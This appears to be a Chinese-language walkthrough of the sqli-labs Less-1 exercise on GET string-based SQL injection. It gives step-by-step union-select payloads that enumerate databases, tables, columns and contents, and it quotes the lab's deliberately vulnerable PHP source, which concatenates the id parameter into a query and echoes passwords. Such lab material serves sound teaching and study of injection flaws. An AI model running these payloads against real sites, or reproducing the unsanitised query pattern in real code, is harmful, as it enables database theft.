# Less-1 **GET Error Based-String**
TAG：GET型注入、字符型注入  
## 漏洞利用
此less展示了最基本的GET型字符注入  
![less1_1](images\less1_1.png)  
当输入?id=1时显示了页面1
![less1_2](images\less1_2.png)  
测试payload：  
```?id=1'```
![less1_3](images\less1_3.png)
此时出现了报错信息，通过此报错信息可以得知，PHP语句中传入的id参数类型是字符串型，所以要把前面的一个单引号闭合要将后面的单引号闭合或注释掉。  
测试payload：  
```?id=1' and 1=1--+```
![less1_4](images\less1_4.png)  
测试payload：  
```?id=1' and 1=2--+```
![less1_5](images\less1_5.png)  
这里不同的显示说明payload影响了代码的处理，可以确定存在注入  
为了进行回显，先判断一下字段数
测试payload：  
```?id=1' order by 1--+```  
```?id=1' order by 2--+```  
```?id=1' order by 3--+```  
```?id=1' order by 4--+```  
![less1_6](images\less1_6.png)  
当测试到字段4时，产生了报错信息，说明只存在3个字段  
现在使用联合查询测试回显点的位置  
测试payload：  
```?id=1' union select 1,2,3--+```  
![less1_7](images\less1_7.png)  
通过页面的显示可以找到对应的回显点，确保我们的注入可以正常显示，如果找不到回显点，就要进行盲注了  
获取数据库名payload:  
```?id=1' union select 1,2,group_concat(schema_name)from(information_schema.schemata)--+```  
![less1_8](images\less1_8.png)  
获取表名payload:  
```?id=0' union select 1,2,group_concat(table_name)from information_schema.tables where table_shema ='information_schema'--+```   
![less1_9](images\less1_9.png)  
获取字段名payload： 
```?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=''--+```  
获得内容payload：  
```?id=-1' union select 1,2,group_concat(字段名) from security.表名--+```

## 源码分析  
### less1源码： 
```<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Less-1 **Error Based- String**</title>
</head>

<body bgcolor="#000000">
    <div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
    <font size="3" color="#FFFF00">

<?php
    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");
    error_reporting(0);
    // take the variables 
    if(isset($_GET['id'])){
        $id=$_GET['id'];
        //logging the connection parameters to a file for analysis.
        $fp=fopen('result.txt','a');
        fwrite($fp,'ID:'.$id."\n");
        fclose($fp);
        // connectivity 
        $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
        $result=mysql_query($sql);
        $row = mysql_fetch_array($result);
        if($row){
  	        echo "<font size='5' color= '#99FF00'>";
  	        echo 'Your Login name:'. $row['username'];
  	        echo "<br>";
  	        echo 'Your Password:' .$row['password'];
  	        echo "</font>";
        }
        else {
	        echo '<font color= "#FFFF00">';
	        print_r(mysql_error());
	        echo "</font>";  
	    }
    }
	else { 
        echo "Please input the ID as parameter with numeric value";
    }
?>
        </font> 
    </div></br></br></br>
    <center>
    <img src="../images/Less-1.jpg" /></center>
    </body>
</html>
```

### 漏洞点分析   
```
    ......
    if(isset($_GET['id'])){
        $id=$_GET['id'];
        $fp=fopen('result.txt','a');
        fwrite($fp,'ID:'.$id."\n");
        fclose($fp);
        $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
        $result=mysql_query($sql);
        $row = mysql_fetch_array($result);
        if($row){
  	        echo "<font size='5' color= '#99FF00'>";
  	        echo 'Your Login name:'. $row['username'];
  	        echo "<br>";
  	        echo 'Your Password:' .$row['password'];
  	        echo "</font>";
        }
        else {
	        echo '<font color= "#FFFF00">';
	        print_r(mysql_error());
	        echo "</font>";  
	    }
    }
	else { 
        echo "Please input the ID as parameter with numeric value";
    }
    ......
```
存在漏洞的页面由PHP编写，它将获取通过GET方式传递到页面的id参数，并进行数据库操作将数据加载给页面  
获取参数的语句：```$id=$_GET['id'];```  
问题也就在这里出现了，现在看一下进行数据库操作的代码
```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
```
这里直接将获取到的id参数写入了请求语句，并把语句传输给了数据库  
入侵者可以很简单的使用单引号'来进行语句的闭合，在正常语句后插入恶意语句来进行数据库的注入  

```
...
echo 'Your Login name:'. $row['username'];
echo "<br>";
echo 'Your Password:' .$row['password'];
...
```
页面将通过数据库查询语句查询到的信息直接显示了出来，这为注入提供了回显点，可以通过此处直接获取恶意语句返回的信息  
